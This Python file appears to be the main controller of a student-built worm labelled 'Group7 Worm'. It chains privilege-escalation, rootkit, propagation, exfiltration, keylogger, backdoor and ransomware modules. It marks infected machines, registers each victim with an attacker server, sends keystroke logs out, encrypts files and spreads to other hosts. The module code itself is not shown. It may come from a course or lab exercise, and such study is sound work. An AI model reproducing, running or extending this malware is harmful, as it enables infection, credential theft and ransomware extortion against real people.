###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import os
import argparse
import netifaces
from time import sleep

from modules import privesc
from modules import rootkit
from modules import propagation
from modules import exfiltration
from modules import keylogger
from modules import backdoor
from modules import instructions
from modules import ransomware

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def main(start_module):
    # Gets the NAT IP address of the computer (10.0.2.XX)
    try: PUBLIC_IP = netifaces.ifaddresses("enp0s3")[netifaces.AF_INET][0]["addr"]
    except ValueError: exit()
    # PUBLIC_IP = os.environ.get("USER")
    print(f"Public IP: {PUBLIC_IP}")

    # Path: /home/$USER/GR0up7.pem
    NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")

    # Computer is already infected
    if os.path.exists(NO_INFECTION_FILE):
        start_module = "instructions"

    # Creates a file for the propagation module to identify whether a computer is already infected or not
    if not (os.path.exists(NO_INFECTION_FILE)):
        with open(NO_INFECTION_FILE, "w") as file:
            pass

    # Creates a instructions file on the server for this specific victim
    instructions.create_victim_instruction(PUBLIC_IP)

    # Map modules to function
    modules = {
        "privesc": privesc.run,
        "rootkit": rootkit.run,
        "propagation": propagation.run,
        "exfiltration": exfiltration.run,
        "keylogger": keylogger.run,
        "backdoor": lambda victim_ip, port: backdoor.run(victim_ip, port),
        "instructions": lambda victim_ip: instructions.run(victim_ip),
        "ransomware": ransomware.run,
    }

    print("[+] Modules initialized")

    # First step
    next_step = start_module
    result = None

    while next_step != "clean":
        print(f"[+] Active module: {next_step}")
        # Execute module and get result and next step
        if next_step == "instructions":
            result, next_step = modules[next_step](PUBLIC_IP)
        else:
            result, next_step = modules[next_step]()
        result = result.split(" ")

        if result and len(result) >= 2:
            # print(result)
            if result[0] == "keylogger":
                if result[1] == "send_log":
                    instructions.send_keylog_to_attacker(PUBLIC_IP)
                elif result[1] == "reset_log":
                    instructions.reset_keylog_file()

            elif result[0] == "backdoor":
                print("test1")
                if len(result) >= 3:
                    print("test2")
                    backdoor.run(result[1], result[2])

            elif result[0] == "ransomware":
                if result[1] == "encrypt":
                    ransomware.encrypt_ransomware()
                elif result[1] == "decrypt":
                    instructions.download_secret_key()

            elif result[0] == "propagation":
                if result[1] == "start":
                    propagation.run()

            if result != "no_data":
                instructions.reset_instruction(PUBLIC_IP)
        elif not result:
            print(f"[-] Module {next_step} failed!")
            break

        if next_step == "instructions":
            sleep(4)


###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

if __name__ == "__main__":
    print("[+] Starting worm...")
    # parse argument
    parser = argparse.ArgumentParser(description="Group7 Worm")
    parser.add_argument(
        "-m",
        type=str,
        help="Module to start (privesc, rootkit, propagation, instructions, keylogger...)",
    )
    args = parser.parse_args()
    print(args)

    start_module = None

    # args.m contains module to start
    # ex: python3 main.py -m privesc
    # args.m = "privesc"
    # if args.m is not None and isinstance(args.myarg, str):
    if args.m is not None:
        start_module = args.m
        print(f"[+] Selected module: {start_module}")
    else:
        print("[-] Wrong module")
        start_module = "privesc"
        print(f"[-] Using default: {start_module}")

    main(start_module)
